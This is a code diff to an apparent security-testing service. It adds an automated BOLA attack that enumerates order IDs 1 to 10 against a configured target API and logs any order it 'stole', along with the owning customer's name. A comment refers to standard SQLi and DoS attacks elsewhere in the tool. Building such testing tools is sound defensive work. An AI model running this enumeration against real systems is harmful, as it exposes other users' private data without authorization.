@@ -297,6 +297,32 @@ async def trigger_attack(attack: AttackRequest):
     
     try:
         async with httpx.AsyncClient() as client:
+            
+            # --- SMART AUTOMATION: BOLA ENUMERATION ---
+            if attack.type == "BOLA":
+                agent_logs.append({"time": _now(), "msg": "🕵️ Smart Attack: Enumerating IDs 1-10...", "type": "NORMAL"})
+                found = False
+                for i in range(1, 11):
+                    # Override payload with dynamic ID
+                    dynamic_payload = {"order_id": i} 
+                    resp = await client.post(
+                        f"{TARGET_URL}{attack_def['endpoint']}", 
+                        json=dynamic_payload,
+                        headers={"X-API-KEY": API_KEY} 
+                    )
+                    
+                    if resp.status_code == 200:
+                         data = resp.json()
+                         msg = f"🔥 VULNERABILITY FOUND: Stole Order #{i} (Owned by {data.get('customer')})"
+                         agent_logs.append({"time": _now(), "msg": msg, "type": "WARNING"}) # Warning = Vulnerability Found
+                         found = True
+                         break # Stop after first success
+                
+                if not found:
+                     agent_logs.append({"time": _now(), "msg": "❌ Enumeration Failed: No valid orders found in range.", "type": "NORMAL"})
+                return {"status": "ok"}
+            
+            # --- STANDARD ATTACKS (SQLi, DoS, etc) ---
             resp = await client.post(
                 f"{TARGET_URL}{attack_def['endpoint']}", 
                 json=attack_def['payload'],
